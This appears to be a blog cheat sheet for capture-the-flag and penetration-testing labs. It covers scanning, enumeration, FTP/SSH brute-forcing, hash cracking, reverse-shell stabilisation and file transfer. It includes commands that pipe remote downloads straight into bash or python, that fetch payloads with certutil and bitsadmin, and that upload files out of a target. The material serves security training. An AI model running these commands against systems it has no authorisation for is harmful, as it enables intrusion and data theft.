---
title: CTF Cheatsheet
date: 2024-01-26
categories: [Cheatsheet, CTF]
tags: [cheatsheet, ctf, capturetheflag, reverse-shell, shell, rce, hash, script, python, john, hashcat, suid]
img_path: /assets/cheatsheet
published: true
image:
    path: cheatsheetCover.png
---

> _Image taken from [CTF-CheatSheet](https://github.com/Rajchowdhury420/CTF-CheatSheet)._

## portScanning

### hailmaryScan
```bash
sudo incursore.sh --type All -H $IP
```
### tcpSynCommonPorts
```bash
sudo nmap -sS -A -Pn --min-rate 10000 $IP
```
### tcpSynAllPorts
```bash
sudo nmap -sS -A -Pn --min-rate 10000 -p- $IP
```

## vulnerabilityScanning

### startNessusWSL2
```bash
sudo /opt/nessus/sbin/nessus-service
```

## webServerEnum

### WAF
```shell
nmap -Pn -p 443 --script http-waf-detect,http-waf-fingerprint $IP
```
```bash
wafw00f https://$IP
```

### tech
```bash
whatweb https://$IP
```

### robots
```bash
curl https://$IP/robots
```
```bash
curl https://$IP/robots.txt
```

### bannerGrabbing
```bash
curl -IL https://$IP/
```
```bash
netcat $IP $PORT
```

### dirBustingAndFileSearch
```bash
ffuf -u http://$domain/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -recursion -e .aspx,.html,.php,.txt,.jsp -c -ac
```
```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .aspx,.html,.php,.txt,.jsp
```
```bash
dirsearch -u http://$IP
```
```bash
nikto -h http://$IP
```
```bash
feroxbuster -u $URL
```

### subdomainBusting
```bash
gobuster dns -d $IP -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -u http://$IP -H "HOST: FUZZ.$domain" -ac -c
```
### subdomainBustingWithLocalDnsAsResolver
```bash
gobuster dns -d $domain -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r $IP:53
```

### vhostBusting
```bash
gobuster vhost -u $URL -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt --append-domain
```

### parameterSearch
```bash
ffuf -u http://internal.analysis.htb/users/list.php?FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -ac
```

## kernelVersion

```bash
uname -a
```

## fileEnumLinux

### SUIDS
```bash
find / -perm -4000 2>/dev/null
```
```bash
find / -perm -u=s 2>/dev/null
```

### configFiles
```bash
/var/www/html$ find . | grep config
```

### dbStringsWithinConfigFiles
```bash
/var/www/html$ grep database <filePath>
```

## fileEnumWindows

### RegistryFilesPasswordString
```powershell
reg query HKLM /f password /t REG_SZ /s
```
```powershell
reg query HKCU /f password /t REG_SZ /s
```

### powershellHistory
```powershell
type C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

## FTP

### bounceAttack
```shell
nmap -Pn -v -n -p80 -b <username>:<pass>@<IP> <target2scan>
```

### bruteForce
```bash
medusa -u <username> -P <passList> -h <IP> -M ftp
```
```bash
hydra -l <username> -P <passList> ftp://<IP> -t 48
```

## SSH

### sshAudit
```shell
python3 /opt/ssh-audit/ssh-audit.py $IP
```

### bruteForce
```bash
hydra -L <userList> -P <passwordList> ssh://$IP
```

## hashCracking

> [Hashcat-examples](https://hashcat.net/wiki/doku.php?id=example_hashes)

### autodetectMode
```bash
hashcat <hashes> /usr/share/wordlists/rockyou.txt --username
```

### bruteForce
```bash
hashcat -m 3200 hashes /usr/share/wordlists/rockyou.txt --username
```

### crackedHashes
```bash
hashcat -m 3200 --username --show hashes
```

> [John hash formats](https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats)

### formatList
```bash
john --list=formats
```

### bruteForce
```bash
john <hashes> --wordlist=/usr/share/wordlists/rockyou.txt
```

## shellStabilization

### withScript
```bash
script -O /dev/null -q /bin/bash
```
```bash
bash
```

### withPython
```bash
python3 -c 'import.pty;pty.spawn("/bin/bash")'
```

### shellConfig
```bash
^Z
[1]+  Stopped                 nc -lvnp 1337
```
```bash
stty raw -echo; fg
```

#### attackHostrowsAndCols
```bash
stty -a
```

### targetRowsAndCols
```bash
www-data@50bca5e748b0:/var/www/html$ stty rows 51 cols 209
```

### termExport
```bash
www-data@50bca5e748b0:/var/www/html$ export TERM=xterm
```

## fileTransferLinux

### httpDownloadServer
```bash
python3 -m http.server
```
```bash
python2.7 -m SimpleHTTPServer
```
```bash
php -S 0.0.0.0:8000
```
```bash
ruby -run -ehttpd . -p8000
```

### httpUploadServer
```bash
python3 -m uploadserver
```

### filelessExecution
```bash
curl http://$IP/$file | bash
```
```bash
wget -qO- https://$IP/pythonScript | python3
```

### fileDownload
```bash
wget http://$IP/$file -O $file
```
```bash
curl http://$IP/$file -o $file
```

### remoteServerDownload
```bash
curl http://$IP/$file -o $file
```

### local2Remote
```bash
scp $file user@remoteHost:/tmp/$file
```

### remote2Local
```bash
scp user@remoteHost:$filePath $filePath2Save
```

### httpsTranfser
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server' # create self-sign cert
```
```bash
mkdir https && cd https # create and move to webroot (must be different dir from the cert)
```
```bash
sudo python3 -m uploadserver 443 --server-certificate /root/server.pem # start webServer using the cert
```
```bash
curl -X POST https://$IP/upload -F 'files=@$file' -F 'files=@$file' --insecure # download from target
```

## fileTransferWindows

### fileDownload
```powershell
wget https://$IP/$file -O /tmp/$file
```
```powershell
curl -o /tmp/$file https://$IP/$file
```
```powershell
Invoke-WebRequest https://$IP/$file -OutFile $file
```
```powershell
bitsadmin /transfer n http://$IP/$file C:\Temp\$file
```
```powershell
certutil.exe -verifyctl -split -f http://$IP/$file
```
```powershell
php -r '$file = file_get_contents("https://$IP/$file"); file_put_contents("$file",$file);'
```

### remote2Local
```powershell
scp user@remoteHost:/tmp/$file C:\Temp\$file
```

### local2Remote
```powershell
scp C:\Temp\$file user@remoteHost:/tmp/$file
```

### fileUpload
```powershell
Invoke-WebRequest -Uri http://$IP -Method POST -Body $b64
```

## privEscTools

```bash
locate linpeas
/usr/share/peass/linpeas/linpeas.sh

locate winpeas
/usr/share/peass/winpeas/winPEASany.exe
/usr/share/peass/winpeas/winPEASx64.exe
/usr/share/peass/winpeas/winPEASx86.exe
```

## Cryptography

### Encryption

> `alias rot13="tr 'A-Za-z' 'N-ZA-Mn-za-m'"`

```bash
# ROT13
echo '<plaintext>' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
echo '<ciphertext>' | tr 'N-ZA-Mn-za-m' 'A-Za-z'
```
```bash
# ROT13.5 (ROT18) > ROT13 (for letters) and ROT5 (for numbers)
echo '<plaintext>' | tr 'A-Za-z0-9' 'N-ZA-Mn-za-m5-90-4'
echo '<ciphertext>' | tr 'N-ZA-Mn-za-m5-90-4' 'A-Za-z0-9'
```
```bash
# ROT47
echo '<plaintext>' | tr '\!-~' 'P-~\!-O'
echo '<ciphertext>' | tr 'P-~\!-O' '\!-~'
```
```bash
# ROT script
#!/usr/bin/bash
    
dual=abcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz
phrase='<plaitext>'
rotat=13
newphrase=$(echo $phrase | tr "${dual:0:26}" "${dual:${rotat}:26}")
echo ${newphrase}
```
```bash
# Caeser cipher
echo '<plaintext>' | tr '[a-zA-Z]' '[x-za-wX-ZA-W]'
echo '<ciphertext>' | tr '[x-za-wX-ZA-W]' '[a-zA-Z]'
```
```bash
# vigenere
/opt/cryptography/vigenere.sh
/opt/cryptography/vigenere.sh -d
```
```bash
# Vigenere script
#!/usr/local/bin/bash

a="ABCDEFGHIJKLMNOPQRSTUVWXYZ"

[[ "${*/-d/}" != "" ]] &&
echo "Usage: $0 [-d]" && exit 1
m=${1:+-}

printf "string: ";read t
printf "keyphrase: ";read -s k
printf "\n"
for ((i=0;i<${#t};i++)); do
  p1=${a%%${t:$i:1}*}
  p2=${a%%${k:$((i%${#k})):1}*}
  d="${d}${a:$(((${#p1}${m:-+}${#p2})%${#a})):1}"
done
echo "$d"
```

### Encoding

```bash
base64 $text
base64 -d $text
```

### Hashing

```bash
openssl md5 $text
openssl sha1 $text
openssl sha256 $text
```

```bash
md5sum $text
sha1sum $text
sha256sum $text
```